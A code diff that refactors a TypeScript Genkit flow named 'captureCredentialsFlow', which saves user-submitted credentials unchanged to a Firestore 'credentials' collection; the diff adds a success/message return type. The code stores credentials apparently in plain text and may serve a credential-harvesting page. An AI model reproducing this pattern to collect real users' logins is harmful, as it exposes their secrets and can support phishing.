@@ -3,6 +3,7 @@
  * @fileOverview A flow to capture user credentials and save them to Firestore.
  *
  * - captureCredentialsFlow - A Genkit flow that receives and saves user credentials.
+ * - CaptureCredentialsOutput - The return type for the captureCredentialsFlow function.
  */
 
 import { ai } from '@/ai/genkit';
@@ -10,8 +11,17 @@ import type { CredentialsInput } from '@/ai/types/credentials';
 import { CredentialsInputSchema } from '@/ai/types/credentials';
 import { initializeFirebaseServer } from '@/firebase/server';
 import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
+import { z } from 'genkit';
 
-export async function captureCredentials(input: CredentialsInput) {
+const CaptureCredentialsOutputSchema = z.object({
+  success: z.boolean(),
+  message: z.string().optional(),
+});
+export type CaptureCredentialsOutput = z.infer<typeof CaptureCredentialsOutputSchema>;
+
+export async function captureCredentials(
+  input: CredentialsInput
+): Promise<CaptureCredentialsOutput> {
   return await captureCredentialsFlow(input);
 }
 
@@ -19,29 +29,22 @@ const captureCredentialsFlow = ai.defineFlow(
   {
     name: 'captureCredentialsFlow',
     inputSchema: CredentialsInputSchema,
-    outputSchema: CredentialsInputSchema,
+    outputSchema: CaptureCredentialsOutputSchema,
   },
-  async (input: CredentialsInput) => {
+  async (input: CredentialsInput): Promise<CaptureCredentialsOutput> => {
     try {
-      // Initialize Firebase for server-side usage
       const { firestore } = initializeFirebaseServer();
-
-      // Get a reference to the 'credentials' collection
       const credentialsCollection = collection(firestore, 'credentials');
 
-      // Add a new document with the credentials and a server-side timestamp
       await addDoc(credentialsCollection, {
         ...input,
         createdAt: serverTimestamp(),
       });
-      
-    } catch (error) {
-      console.error('Error saving credentials to Firestore:', error);
-      // We will still return the input to the client to complete the flow.
-      // The client-side logic is designed to show the alert regardless of success or failure.
-    }
 
-    // Return the input to signal completion to the client.
-    return input;
+      return { success: true };
+    } catch (error: any) {
+      console.error('Error saving credentials to Firestore:', error);
+      return { success: false, message: error.message };
+    }
   }
 );
